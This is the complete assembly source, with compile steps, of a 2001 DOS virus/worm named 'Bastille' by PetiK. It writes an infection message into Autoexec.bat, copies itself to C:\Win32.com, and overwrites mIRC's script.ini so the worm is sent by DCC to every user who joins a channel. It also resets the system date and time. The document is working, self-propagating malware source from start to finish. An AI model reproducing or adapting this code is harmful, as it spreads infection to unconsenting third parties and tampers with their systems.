; Bastille Virus/Worm par PetiK le 23/04/2001
; To compile :
; @echo off
; tasm bastille
; tlink /t bastille
; del *.map
; del *.obj


.model small
.code

org 100h

DEBUT:
OUVRE_AUTO:
    mov ax,3D01h
    lea dx,FILE
    int 21h
    xchg ax,bx

    xor cx,cx
    mov dx,cx
    mov ax,4202h
    int 21h

    mov cx,AUTOL
    lea dx,DAUTO
    mov ah,40h
    int 21h

    mov ah,3Eh
    int 21h

COPIE_VIRUS:
    mov ah,3Ch
    xor cx,cx
    lea dx,COPIE
    int 21h
    xchg ax,bx

    mov ah,40h
    mov cx,offset VRAIFIN - offset DEBUT
    lea dx,DEBUT
    int 21h

    mov ah,3Eh
    int 21h

MIRC:   mov ah,3Ch
    xor cx,cx
    lea dx,MIRCF1
    int 21h
    xchg ax,bx

    mov cx,MIRCL
    lea dx,DMIRC
    mov ah,40h
    int 21h

    mov ah,3Eh
    int 21h

    mov ah,41h
    mov dx,offset MIRCF2
    int 21h 
    mov ah,56h
    mov dx,offset MIRCF1
    mov di,offset MIRCF2
    int 21h
    mov ah,41h
    mov dx,offset MIRCF1
    int 21h

DATE:   mov ah,2Bh
    int 21h
        mov dh,7
        mov dl,14
        mov cx,2001
    int 21h

HEURE:  mov ah,2Dh
    int 21h
        mov cx,0A00h
    xor dx,dx
    int 21h

FIN:    mov ah,4Ch
    int 21h
    

FILE    db 'C:\Autoexec.bat',00h
MIRCF1  db 'C:\script.ini',00h
MIRCF2  db 'C:\mirc\script.ini',00h
COPIE   db 'C:\Win32.com',00h
WHO     db 'Bastille Virus/Worm by PetiK (c)2001',00h


DAUTO:  db '',0dh,0ah
        db '@echo off',0dh,0ah
        db 'cls',0dh,0ah
        db 'echo You''re infected by Bastille Virus (c)2001',0dh,0ah
        db 'echo.',0dh,0ah
        db 'echo Don''t panic ! It''s not dangerous, just fatal !!',0dh,0ah
        db 'pause'
AUTOL   equ $-DAUTO

DMIRC   db '[script]',0dh,0ah
    db 'n0=on 1:start:{',0dh,0ah
    db 'n1= .sreq ignore',0dh,0ah
    db 'n2=}',0dh,0ah   
    db 'n3=on 1:connect:/rename C:\Win32.com C:\Bastille.com',0dh,0ah
    db 'n4=on 1:join:#:{',0dh,0ah
    db 'n5=if ($nick != $me) { dcc send $nick C:\Bastille.com }',0dh,0ah
    db 'n6=}',0dh,0ah
    db 'n7=on 1:disconnect:/rename C:\Bastille.com C:\Win32.com'
MIRCL   equ $-DMIRC
    
VRAIFIN:
end DEBUT
